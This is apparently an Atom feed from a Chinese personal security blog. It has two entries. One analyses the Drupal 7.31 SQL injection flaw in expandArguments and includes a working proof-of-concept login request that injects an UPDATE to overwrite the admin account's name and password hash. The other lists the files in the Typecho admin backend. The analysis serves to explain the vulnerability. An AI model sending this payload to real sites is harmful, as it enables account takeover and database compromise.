<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://bagongzi.github.io</id>
    <title>八公子</title>
    <updated>2020-05-20T19:15:55.576Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://bagongzi.github.io"/>
    <link rel="self" href="https://bagongzi.github.io/atom.xml"/>
    <logo>https://bagongzi.github.io/images/avatar.png</logo>
    <icon>https://bagongzi.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 八公子</rights>
    <entry>
        <title type="html"><![CDATA[Drupal 7.31 SQL注入分析及POC]]></title>
        <id>https://bagongzi.github.io/post/dy-iELgN7/</id>
        <link href="https://bagongzi.github.io/post/dy-iELgN7/">
        </link>
        <updated>2020-05-20T19:00:52.000Z</updated>
        <content type="html"><![CDATA[<p>这个漏洞昨天爆出的 ，今天才有时间看代码。</p>
<p>在Drupal中，执行sql语句都是使用PDO模型进行的，这样做一般来说是可以规避大多数的注入，因为占位符的使用对sql语句的语法进行了限制。</p>
<p>但是这也不意味着绝对的安全，比如这次的漏洞。</p>
<p>在Drupal的user模块中，找到user.module：</p>
<pre><code>$account = db_query(&quot;SELECT * FROM {users} WHERE name = :name AND status = 1&quot;, array(':name' =&gt; $form_state['values']['name']))-&gt;fetchObject();
</code></pre>
<p>这里的:name就是占位符，它的内容来源于后面的$form_state。跟进这个db_query函数，看看是如何处理表单数据的。</p>
<p>折腾完，找到了expandArguments函数，这个函数的作用就是用前面db_query的参数进行最终查询语句的获取，正是由于这个函数对$key值的处理不当导致了漏洞的产生。</p>
<p>POC：</p>
<pre><code>name[0%20;update users set name%3d'owned',pass%3d'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' where uid %3d 1;%23%20%20]=admin&amp;name[0]=111111&amp;pass=shit2&amp;test2=test&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in
</code></pre>
<p>OC中的name数组就是传到函数中的Array，然后使用expandArguments函数对其进行处理。</p>
<p>在处理的过程中，以这种方式得到新的数组：</p>
<p><code>$new_keys[$key . '_' . $i] = $value;</code></p>
<p>最后获取query语句的时候，会用到这个$new_keys。</p>
<pre><code>$query = preg_replace('#' . $key . '\b#', implode(', ', array_keys($new_keys)), $query);
</code></pre>
<p>那么问题就来了。如果可以控制这个$key，那么我们就可以构造出语句进行执行（注意：PDO模型可以多条执行语句）。</p>
<p>分析POC，对函数进行分析调试：</p>
<figure data-type="image" tabindex="1"><img src="http://192.168.2.105:999/usr/uploads/2020/05/816978900.png" alt="" loading="lazy"></figure>
<p>可以看到，expandArguments函数就是把传递进来的name一层一层分离，最后将key带入最终的sql语句生成过程。上图最后的query就是最终要执行的SQL语句，问题是PDO可以多条执行，所以update语句就会执行成功了。</p>
<p>归结于一句话：Drupal使用:name进行SQL语句拼接，expandArgument函数将:name变为:name0中，使用:name_<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mn>0</mn><mi mathvariant="normal">的</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">式</mi><mi mathvariant="normal">完</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi></mrow><annotation encoding="application/x-tex">key0的方式完成，这个</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">0</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">完</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span></span></span></span>key是可控的，所以导致漏洞产生。</p>
<p>执行结果如下：</p>
<figure data-type="image" tabindex="2"><img src="http://192.168.2.105:999/usr/uploads/2020/05/17877259.png" alt="" loading="lazy"></figure>
<p>把我之前的admin用户给覆盖了。POC中的密码是使用了drupal内置的一个生成脚本进行生成的，即scripts中的password-hash.sh。</p>
<p>这个漏洞威力也很大，因为你控制了对方的数据库，如此灵活的条件，势必会引发更多花样的攻击手段。</p>
<p>这个漏洞给我的感受就是：“没有绝对的安全”。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[typecho后台文件对应说明]]></title>
        <id>https://bagongzi.github.io/post/typecho-hou-tai-wen-jian-dui-ying-shuo-ming/</id>
        <link href="https://bagongzi.github.io/post/typecho-hou-tai-wen-jian-dui-ying-shuo-ming/">
        </link>
        <updated>2020-05-20T18:23:39.000Z</updated>
        <content type="html"><![CDATA[<pre><code>welcome.php	        博客首次安装成功的欢迎界面
common.php	        检测是否为第一次登陆，检测程序是否可有升级
common-js.php	        消息处理及后台菜单展开的js
upgrade.php	        程序升级引导
login.php	        登陆界面
register.php	        用户注册页面
header.php	        头部加载css和js等
copyright.php	        版权声明
form-js.php	        form对应的js
table-js.php	        table对应的js
footer.php	        页脚
menu.php	        菜单导航条
extending.php	        插件拓展后台菜单的接口
page-title.php	        页面标题
index.php	        进入后台的首页，对应菜单为网站概要
profile.php	        个人设置
plugins.php	        插件管理
options-plugin.php	插件设置页面
themes.php	        网站外观
theme-editor.php	编辑模板的页面
options-theme.php	设置模板的页面即模板后台
write-post.php	        文章撰写页面
write-js.php	        撰写文章/页面时的发布时间，标签，分类，保存草稿，高价设置等
file-upload.php	        文章/页面附件上传，及管理界面
file-upload-js.php	文章/页面附件上传，及管理功能
custom-fields.php	自定义字段界面
custom-fields-js.php	自定义字段功能实现
editor-js.php	        编辑器
write-page.php	        创建页面
manage-posts.php	管理文章界面
manage-pages.php	管理页面界面
manage-comments.php	管理评论界面
manage-categories.php	管理分类界面
category.php	        某个分类的编辑页面
manage-tags.php	        管理标签界面
manage-medias.php	所有文章的附件管理页面
media.php	        某个附件的管理
manage-users.php	所有用户管理页面
user.php	        编辑某个用户
options-general.php	网站基本设置页面
options-discussion.php	评论设置页面
options-reading.php	阅读设置页面
options-permalink.php	永久链接设置页面

![](https://bagongzi.github.io/post-images/1590001148065.png)</code></pre>
]]></content>
    </entry>
</feed>